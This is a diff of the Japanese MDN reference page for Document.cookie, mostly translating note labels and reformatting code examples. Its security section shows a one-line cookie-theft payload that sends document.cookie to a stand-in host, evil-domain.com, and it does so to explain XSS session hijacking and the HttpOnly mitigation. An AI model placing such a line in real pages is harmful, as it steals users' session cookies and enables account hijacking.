@@ -2,6 +2,7 @@
 title: Document.cookie
 slug: Web/API/Document/cookie
 ---
+
 {{APIRef("DOM")}}
 
 {{domxref("Document")}} の `cookie` プロパティで、文書に関連付けられた[クッキー](/ja/docs/Web/HTTP/Cookies)を読み書きすることができます。これは実際のクッキーの値に対するゲッターとセッターとして動作します。
@@ -28,16 +29,16 @@ document.cookie = newCookie;
 
   - `;path=パス` (例えば、 '`/`' 、 '`/mydir`') 指定されない場合は、既定で現在の文書の位置のパスになります。
 
-    > **Note:** {{Gecko("6.0")}} 以前では、引用符付きのパスは引用符が文字列を囲む区切り文字ではなく、文字列の一部であるかのように扱われます。これはすでに修正されています。
+    > **メモ:** Gecko 6.0 以前では、引用符付きのパスは引用符が文字列を囲む区切り文字ではなく、文字列の一部であるかのように扱われます。これはすでに修正されています。
 
   - `;domain=ドメイン` (例えば、 '`example.com`' または '`subdomain.example.com`')。指定されていない場合は、既定で現在の文書の位置のホストの部分になります。初期の仕様とは対照的に、ドメイン名の前のドットは無視されますが、ブラウザーはその様なドットを含むクッキーの設定を辞退することができます。ドメインが設定されれば、サブドメインも常に含まれます。
 
-    > **Note:** ドメインは JavaScript のオリジンと一致している*必要があります*。外部ドメインへのクッキーの設定は暗黙に無視されます。
+    > **メモ:** ドメインは JavaScript のオリジンと一致している*必要があります*。外部ドメインへのクッキーの設定は暗黙に無視されます。
 
   - `;max-age=寿命 (秒数)` (例えば、1 年であれば `60*60*24*365` または 31536000)
   - `;expires=GMTString 形式の日付` もし `expires` も `max-age` も指定しなければ、有効期限はセッションの終了までになります。
 
-    > **Warning:** ユーザーのプライバシーを考慮するのであれば、ブラウザーの有効期限の管理に頼るのではなく、ウェブアプリの実装で指定した期間の経過後にクッキーを無効化することが重要です。多くのブラウザーはユーザーがクッキーを無期限に設定することができますが、これは安全ではありません。
+    > **警告:** ユーザーのプライバシーを考慮するのであれば、ブラウザーの有効期限の管理に頼るのではなく、ウェブアプリの実装で指定した期間の経過後にクッキーを無効化することが重要です。多くのブラウザーはユーザーがクッキーを無期限に設定することができますが、これは安全ではありません。
 
     - 値の形式について知りたい方は、 {{jsxref("Date.toUTCString()")}} をご覧ください。
 
@@ -53,11 +54,11 @@ document.cookie = newCookie;
   - `__Secure-` ブラウザーに、セキュアなチャネルを通してリクエストが送信された場合にのみクッキーを含めるよう指示します。
   - `__Host-` ブラウザーに、安全なオリジンからのクッキーのみを使用することに加え、クッキーのスコープをサーバーから渡された path 属性に限定します。サーバーが path 属性を省略した場合は、要求の URI の「ディレクトリ」が使用されます。これは、クッキーが他のドメインに送出されることを防ぐために、 domain 属性が存在してはいけないことも指示します。 Chrome では、 path 属性は常にオリジンになります。
 
-  > **Note:** ダッシュは接頭辞の一部とみなされます。
+  > **メモ:** ダッシュは接頭辞の一部とみなされます。
 
-  > **Note:** これらのフラグは `secure` 属性と一緒の場合のみ設定できます。
+  > **メモ:** これらのフラグは `secure` 属性と一緒の場合のみ設定できます。
 
-> **Note:** 上記のコードに見られるように、 `document.cookie` はネイティブの*セッター*及び*ゲッター*を持つ[アクセサープロパティ](/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description)であり、値を持つ [データプロパティ](/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description)では*ありません*。書き込んだものと読みこんだものは同じにはならず、常に JavaScript インタープリターに仲介されます。
+> **メモ:** 上記のコードに見られるように、 `document.cookie` はネイティブの*セッター*及び*ゲッター*を持つ[アクセサープロパティ](/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description)であり、値を持つ [データプロパティ](/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description)では*ありません*。書き込んだものと読みこんだものは同じにはならず、常に JavaScript インタープリターに仲介されます。
 
 ## 例
 
@@ -84,9 +85,9 @@ document.cookie = "test1=Hello";
 document.cookie = "test2=World";
 
 const cookieValue = document.cookie
-  .split('; ')
-  .find(row => row.startsWith('test2'))
-  .split('=')[1];
+  .split("; ")
+  .find((row) => row.startsWith("test2"))
+  .split("=")[1];
 
 function alertCookieValue() {
   alert(cookieValue);
@@ -105,9 +106,15 @@ function alertCookieValue() {
 
 ```js
 function doOnce() {
-  if (document.cookie.replace(/(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/, "$1") !== "true") {
+  if (
+    document.cookie.replace(
+      /(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/,
+      "$1",
+    ) !== "true"
+  ) {
     alert("Do something here!");
-    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
+    document.cookie =
+      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
   }
 }
 ```
@@ -122,7 +129,8 @@ function doOnce() {
 
 ```js
 function resetOnce() {
-  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+  document.cookie =
+    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 }
 ```
 
@@ -137,16 +145,20 @@ function resetOnce() {
 ```js
 //ES5
 
-if (document.cookie.split(';').some(function(item) {
-    return item.trim().indexOf('reader=') == 0
-})) {
-    console.log('The cookie "reader" exists (ES5)')
+if (
+  document.cookie.split(";").some(function (item) {
+    return item.trim().indexOf("reader=") == 0;
+  })
+) {
+  console.log('The cookie "reader" exists (ES5)');
 }
 
 //ES2016
 
-if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
-    console.log('The cookie "reader" exists (ES6)')
+if (
+  document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+) {
+  console.log('The cookie "reader" exists (ES6)');
 }
 ```
 
@@ -155,16 +167,18 @@ if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))
 ```js
 //ES5
 
-if (document.cookie.split(';').some(function(item) {
-    return item.indexOf('reader=1') >= 0
-})) {
-    console.log('The cookie "reader" has "1" for value')
+if (
+  document.cookie.split(";").some(function (item) {
+    return item.indexOf("reader=1") >= 0;
+  })
+) {
+  console.log('The cookie "reader" has "1" for value');
 }
 
 //ES2016
 
-if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
-    console.log('The cookie "reader" has "1" for value')
+if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+  console.log('The cookie "reader" has "1" for value');
 }
 ```
 
@@ -175,7 +189,8 @@ if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
 クッキーは普段、ウェブアプリケーションでユーザーと認証されたセッションを識別するために使われます。そこで、ウェブアプリケーションからのクッキーを盗まれると、認証されたユーザーのセッションハイジャックにつながります。クッキーを盗むための一般的な方法は、ソーシャルエンジニアリングを使用するか、アプリケーション内の XSS 脆弱性の悪用です。
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 `HTTPOnly` クッキー属性は、 JavaScript からのクッキー値へのアクセスを防止することで、この攻撃を軽減することに役立ちます。より詳細情報は [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/) を見てください。
@@ -211,10 +226,7 @@ Accept: */*
 
 ## 仕様書
 
-| 仕様書                                                                                       | 状態                                 | 備考     |
-| -------------------------------------------------------------------------------------------- | ------------------------------------ | -------- |
-| {{SpecName("DOM2 HTML", "html.html#ID-8747038", "Document.cookie")}} | {{Spec2("DOM2 HTML")}}         | 初回定義 |
-| {{SpecName("Cookie Prefixes")}}                                                     | {{Spec2("Cookie Prefixes")}} |          |
+{{Specifications}}
 
 ## ブラウザーの互換性
 
